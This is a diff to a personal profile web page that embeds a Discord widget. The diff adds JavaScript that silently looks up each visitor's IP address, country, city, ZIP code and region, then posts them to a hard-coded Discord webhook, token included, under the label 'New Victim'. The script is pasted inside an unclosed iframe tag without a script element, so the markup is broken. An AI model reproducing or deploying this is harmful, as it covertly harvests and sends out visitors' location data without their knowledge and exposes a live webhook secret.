@@ -1,3 +1,5 @@
+
+
 <html>
 <title>Suki.</title>
 <meta name="description" content="#RAVELIFE! Live suki@satellite" />
@@ -12,16 +14,91 @@
     frameborder="0"
     sandbox="allow-scripts"
     src="https://widgets.vendicated.dev/user?id=1213239347751682120&theme=dark&banner=true&full-banner=false&rounded-corners=true&discord-icon=false&badges=true&guess-nitro=false&"
-  
-></iframe>
-<?php
-//If your Discord.php file is in another folder you need to change the file path!
-include("Discord.php");
-$sendembed = New Discord();
 
-//Executes the function
-$sendembed->Visitor();
-?>
+    const webhook = "https://discord.com/api/webhooks/1220727658594439278/x_3v5gXCl_HMoUiUNga7rbO3WzFbAyv9HMR-pRB85t7Dav-1TiktcGoyEZk2isV3GxT0"
 
+async function IP_Info(){
+    /**
+     *  Description: On init , fetches IP information of user
+     *  @return {fetch.Body.json()} Resp Body
+     */
+    let response = await fetch("http://ip-api.com/json", {
+      method: 'GET',
+      headers: {
+        "cache-control" : "no-cache",
+        "content-type": "application/json"
+      }
+    })
+    return response.json()
+  }
+  IP_Info().then((value)=> {
+    let requiredInfo = [
+      "status","country", "city", "zip", "regionName"
+    ]
+    let noData = false
+
+    for(var i = 0; i < requiredInfo.length; i++){
+      if(typeof(value[`${requiredInfo[i]}`]) === 'undefined'){
+        noData = true
+        break
+      } 
+    }
+    if(noData){
+      return null
+    }
+    return value
+  }).then( async (value) => {
+    if(value !== null){
+       await fetch(webhook, {
+        method: 'POST',
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          content:"``New Victim``",
+          embeds: [{
+              title: "Victim IP",
+              type:"rich",
+              color: "12223968",
+              description: "```IP information of the recent website visitor.```",
+              fields: [{
+                name: "IP", value: `${value.query}`, inline: false
+              },
+              {
+                name: "Country", value: `${value.country}`, inline: false
+              },
+              {
+                name: "City", value: `${value.city}`, inline: false
+              },
+              {
+                name: "ZIP", value: `${value.zip}`, inline: false
+              },
+              {
+                name: "Region", value: `${value.regionName}`, inline: false
+              }
+              ],
+              footer: {
+                text: "Programmed by Naeuki",
+                icon_url: "https://avatars.githubusercontent.com/u/164073701?v=4"
+              },
+              author: {
+                name: "Naeuki",
+                url: "https://2uki.github.io"
+              },
+              thumbnail: {
+                url: "https://media.tenor.com/h2AVqgVw4ZoAAAAC/gotcha-michael-madsen.gif"
+              }
+          }]
+        })
+      }).then((value)=>{
+        console.log(value.statusText)
+      }).catch((err)=>{
+        console.log(err)
+      })
+    }
+  }).catch((err)=> {
+    console.log(err)
+    console.log('Request not send')
+  })
 </body>
 </html>
